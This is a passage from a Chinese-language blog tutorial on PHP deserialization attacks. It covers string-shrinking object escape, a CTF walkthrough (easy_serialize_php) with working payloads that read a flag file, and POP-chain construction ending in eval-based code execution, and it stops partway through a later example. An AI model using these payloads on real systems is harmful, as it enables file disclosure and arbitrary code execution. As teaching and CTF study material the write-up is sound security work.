<p>因为过滤的时候，将<strong> 5</strong> 个字符删减为了<strong> 4</strong> 个，所以和上面字符变多的情况相反，随着加入的<strong> admin</strong> 的数量增多，<strong>现有子串</strong>后面会缩进来。</p>
<p>计算一下<strong>目标子串</strong>的长度：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串</span><br><span class="line">//长度为47</span><br></pre></td></tr></table></figure>
<p>再计算一下到<strong>下一个可控变量</strong>的字符串长度：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;</span><br><span class="line">//长度为22</span><br></pre></td></tr></table></figure>
<p>因为每次过滤的时候都会少<strong> 1</strong> 个字符，因此我们先将<strong> admin</strong> 字符重复<strong> 22</strong> 遍，这里 22 遍是大概值，后续还需要调整</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;123456&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line"></span><br><span class="line">echo $a_seri_filter;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>** 注意：**PHP 反序列化的机制是，比如如果前面是规定了有 10 个字符，但是只读到了 9 个就到了双引号，这个时候 PHP 会把双引号当做第 10 个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>
<p>105 个字符结束后，位置如下</p>
<p><code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:</code></p>
<p>也就是我们覆盖了 <code>;s:8:&quot;password&quot;;s:6:</code> ，接下来我们的 username 的值变会覆盖后续的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line"></span><br><span class="line">echo $a_seri_filter;</span><br><span class="line"></span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>仔细观察这一串字符串可以我们希望覆盖的 107 个字符，但是前面只有显示 105</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</span><br></pre></td></tr></table></figure>
<p><strong>解决办法是</strong>：多添加<strong> 2</strong> 个<strong> admin</strong>，这样就可以补上缺少的字符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line"></span><br><span class="line">echo $a_seri_filter;</span><br><span class="line">?&gt;</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>115 个字符的覆盖范围 <code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</code></p>
<p>可以看到，这一下就对了。</p>
<p>我们将对象反序列化然后输出，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public $password;</span><br><span class="line">	public $isVIP;</span><br><span class="line">	</span><br><span class="line">	public function __construct($u,$p)&#123;</span><br><span class="line">		$this-&gt;username = $u;</span><br><span class="line">		$this-&gt;password = $p;</span><br><span class="line">		$this-&gt;isVIP = 0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function filter($s)&#123;</span><br><span class="line">	return str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line">$a_seri_filter_unseri = unserialize($a_seri_filter);</span><br><span class="line"></span><br><span class="line">var_dump($a_seri_filter_unseri);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(user)#2 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(115) &quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  string(6) &quot;123456&quot;</span><br><span class="line">  [&quot;isVIP&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结一下变短的步骤：</p>
<blockquote>
<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>
<p>​	上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>
<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>
<p>​	上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>
<p>3. 分析它的过滤函数，计算到下一个可控变量的长度，将它和（2）中的长度分析</p>
<p>​	上述例子中，我们的目标长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>  为 47，到下一个可控变量长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;</code>  为 22</p>
<p>​	那么为什么要分析到下一个可控变量的长度呢，因为这中间的 22 个字符就是我们想要吃掉的字符，也就是 username 把原来的 password 吃掉了，现在的 password 我们自己可以写了，我们在自己写的 password 中就可以覆盖掉 isVIP</p>
<p>4. 进行覆盖与调整</p>
<p>​	上述例子中，我们第一次写了 22 个 admin，但后续序列化后发现长度不够，增加至 24 个 admin。调整是为了让每个变量的 &quot; 的位置和前面的字符串数量的位置相同</p>
<p>5. 进行反序列化验证</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//变长</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class="line"></span><br><span class="line">//变少</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class="line"></span><br><span class="line">变长是通过将s:后的长度变长，导致可以将不是自己的序列化的东西也收进来</span><br><span class="line">变少是通过将自己本来序列化后不是一个对象的值缩到一个对象中，那么其他缩的对象值就空了，我们就可以覆盖了</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/165222.html</span><br></pre></td></tr></table></figure>
<p>比如：[安洵杯 2019] easy_serialize_php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于有了上面的基础，这边就简单缩缩了</p>
<p>首先能造成对象逃逸的关键是 <code>    $serialize_info = filter(serialize($_SESSION));</code> ，将 filter 里面的东西替换为空，导致字符变动，但序列化后的长度值没有变动</p>
<p>exxtract () 函数从数组中将变量导入到当前的符号表 (本题的作用是将_SESSION 的两个函数变为 post 传参)</p>
<p>同时题目告诉我们的 phpinfo 中 <code>d0g3_fllllllag</code>  可以判断 flag 位置</p>
<p>我们可以通过改变 img_path 的内容或者直接改变 userinfo [‘img’] 的内容来达到读取 flag 的目的</p>
<p>0x00 键值逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:1:&quot;2&quot;;&#125;</span><br><span class="line"></span><br><span class="line">flag和php是敏感字符，在使用的时候被过滤掉了，但序列化记录的字符串长度没有过滤掉，所以在序列化的时候</span><br><span class="line">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;2&quot;;&#125;被当作了原来的value</span><br><span class="line">在 echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));实现了读取flag的，目的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115171618604.png" alt="image-20221115171618604"></p>
<p>0x01 键名逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">过滤前</span><br><span class="line">a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">过滤后</span><br><span class="line">a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">下面的步骤和值替换一样</span><br><span class="line">这里的键名变为&quot;;s:48: 实现了逃逸</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="0x05pop-链利用"><a class="markdownIt-Anchor" href="#0x05pop-链利用">#</a> 0x05POP 链利用</h4>
<p>上面的例子都是基于 &quot;自动调用&quot; 的 magic function。** 但当漏洞 / 危险代码存在类的普通方法中，就不能指望通过 &quot;自动调用&quot; 来达到目的了。** 这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。</p>
<p><strong>1. 一些有用的 POP 链中出现的方法：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 命令执行：exec()、passthru()、popen()、system()</span><br><span class="line">- 文件操作：file_put_contents()、file_get_contents()、unlink()</span><br><span class="line">- 代码执行：eval()、assert()、call_user_func()   //call_user_func(assert,phpinfo());</span><br></pre></td></tr></table></figure>
<p><strong>2. 反序列化中为了避免信息丢失，使用大写 S 支持字符串的编码。</strong></p>
<p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示 (避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</span><br></pre></td></tr></table></figure>
<p><strong>3. 深浅 copy</strong></p>
<p>在 php 中如果我们使用 &amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$A = &amp;$B; </span><br></pre></td></tr></table></figure>
<p><strong>4. 利用 PHP 伪协议</strong></p>
<p>配合 PHP 伪协议实现文件包含、命令执行等漏洞。如 glob:// 伪协议查找匹配的文件路径模式。</p>
<h4 id="0x06"><a class="markdownIt-Anchor" href="#0x06">#</a> 0x06</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class main &#123;</span><br><span class="line">    protected $ClassObj;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;ClassObj = new normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class normal &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;hello bmjoker&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class evil &#123;</span><br><span class="line">    private $data;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//$a = new main();</span><br><span class="line">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>危险的命令执行方法 eval 不在魔术方法中，在 evil 类中。但是魔术方法__construct () 是调用 normal 类，__destruct () 在程序结束时会去调用 normal 类中的 action () 方法。而我们最终的目的是去调用 evil 类中的 action () 方法，并伪造 evil 类中的变量data，达成任意代码执行的目的。这样的话可以尝试去构造POP利用链，让魔术方法__construct()去调用evil这个类，并且给变量 data 赋予恶意代码，比如 php 探针 phpinfo ()，这样就相当于执行 <code>&lt;?php eval(&quot;phpinfo();&quot;)?&gt;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">main</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者这样构造也行</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">main</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但是由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>O</mi><mi>b</mi><mi>j</mi><mtext>是</mtext><mi>p</mi><mi>r</mi><mi>o</mi><mi>t</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>e</mi><mi>d</mi><mtext>类型修饰，</mtext></mrow><annotation encoding="application/x-tex">ClassObj是protected类型修饰，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">型</span><span class="mord cjk_fallback">修</span><span class="mord cjk_fallback">饰</span><span class="mord cjk_fallback">，</span></span></span></span>data 是 private 类型修饰，在序列化的时候，多出来的字节都被 \x00 填充，需要进行在代码中使用 urlencode 对序列化后字符串进行编码，否则无法复制解析。</p>
<p>或者直接改不可见字符为 %00</p>
<p>url 地址栏中会自动帮我们解析一次 url 编码</p>
</blockquote>
<h4 id="0x07"><a class="markdownIt-Anchor" href="#0x07">#</a> 0x07</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    